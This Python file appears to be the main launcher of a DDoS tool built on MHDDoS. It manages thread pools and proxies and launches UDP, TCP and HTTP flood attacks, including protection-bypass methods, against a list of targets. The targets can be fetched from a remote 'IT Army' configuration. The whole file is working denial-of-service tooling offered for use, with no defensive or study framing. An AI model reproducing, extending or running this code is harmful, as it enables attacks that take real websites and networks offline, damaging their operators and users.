import queue
from collections import namedtuple
from concurrent.futures import Future
from concurrent.futures.thread import _WorkItem
from threading import Thread, Event
from time import sleep, time

from yarl import URL

from src.cli import init_argparse
from src.core import logger, cl, UDP_THREADS, LOW_RPC, IT_ARMY_CONFIG_URL
from src.dns_utils import resolve_host, get_resolvable_targets
from src.mhddos import main as mhddos_main
from src.output import AtomicCounter, show_statistic, print_banner, print_progress
from src.proxies import update_proxies
from src.system import fix_ulimits
from src.targets import Targets


Params = namedtuple('Params', 'url, ip, method, threads')


class DaemonThreadPool:
    def __init__(self, num_threads):
        self._queue = queue.SimpleQueue()
        for cnt in range(num_threads):
            try:
                Thread(target=self._worker, daemon=True).start()
            except RuntimeError:
                logger.warning(
                    f'{cl.RED}Failed to run all {num_threads} threads - maximum {cnt - 50}{cl.RESET}')
                exit()

    def submit(self, fn, *args, **kwargs):
        f = Future()
        w = _WorkItem(f, fn, args, kwargs)
        self._queue.put(w)
        return f

    def _worker(self):
        while True:
            work_item = self._queue.get(block=True)
            if work_item is not None:
                work_item.run()
                del work_item


def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table):
    threads_per_target = total_threads // len(targets)
    params_list = []
    for target in targets:
        ip = resolve_host(target)
        target = URL(target)
        # UDP
        if target.scheme == 'udp':
            params_list.append(Params(target, ip, 'UDP', UDP_THREADS))

        # TCP
        elif target.scheme == 'tcp':
            params_list.append(Params(target, ip, 'TCP', threads_per_target))

        # HTTP(S)
        else:
            threads = threads_per_target // len(http_methods)
            for method in http_methods:
                params_list.append(Params(target, ip, method, threads))

    logger.info(f'{cl.GREEN}Launching an attack ...{cl.RESET}')
    statistics = {}
    event = Event()
    event.set()
    for params in params_list:
        thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
        statistics[params] = thread_statistics
        kwargs = {
            **params._asdict(),
            'rpc': rpc,
            'sock_timeout': proxy_timeout,

            'thread_pool': thread_pool,
            'event': event,
            'statistics': thread_statistics,
            'proxies': proxies,
        }
        mhddos_main(**kwargs)
        if not table:
            logger.info(
                f"{cl.YELLOW}Attack {cl.BLUE}% s {cl.YELLOW} with {cl.BLUE}% s {cl.YELLOW} threads: {cl.BLUE} %d{cl.YELLOW}!{cl.RESET}"
                % (params.url.host, params.method, params.threads))

    if not (table or debug):
        print_progress(period, 0, len(proxies))
        sleep(period)
    else:
        ts = time()
        refresh_rate = 4 if table else 2
        sleep(refresh_rate)
        while True:
            passed = time() - ts
            if passed > period:
                break
            show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
            sleep(refresh_rate)
    event.clear()


def start(total_threads, period, targets_iter, rpc, proxy_timeout, http_methods, vpn_mode, debug, table):
    if table:
        debug = False

    for bypass in ('CFB', 'DGB', 'BYPASS'):
        if bypass in http_methods:
            logger.warning(f'{cl.RED}The {bypass} method is not guaranteed to work - default attacks may be more effective{cl.RESET}')

    thread_pool = DaemonThreadPool(total_threads)
    while True:
        targets = list(get_resolvable_targets(targets_iter))
        if not targets:
            logger.error(f'{cl.RED}No available targets found{cl.RESET}')
            exit()

        if rpc < LOW_RPC:
            logger.warning(
                f'{cl.RED} RPC less than {LOW_RPC}. This can lead to a drop in productivity '
                f'by increasing the number of reconnections {cl.RESET} '
            )

        no_proxies = vpn_mode or all(target.lower().startswith('udp://') for target in targets)
        proxies = []
        if not no_proxies:
            proxies = update_proxies(thread_pool, period, targets, proxy_timeout)
        run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_methods, vpn_mode, proxy_timeout, debug, table)


if __name__ == '__main__':
    args = init_argparse().parse_args()
    print_banner(args.vpn_mode)
    fix_ulimits()
    if args.itarmy:
        targets = Targets([], IT_ARMY_CONFIG_URL)
    else:
        targets = Targets(args.targets, args.config)

    start(
        args.threads,
        args.period,
        targets,
        args.rpc,
        args.proxy_timeout,
        args.http_methods,
        args.vpn_mode,
        args.debug,
        args.table,
    )
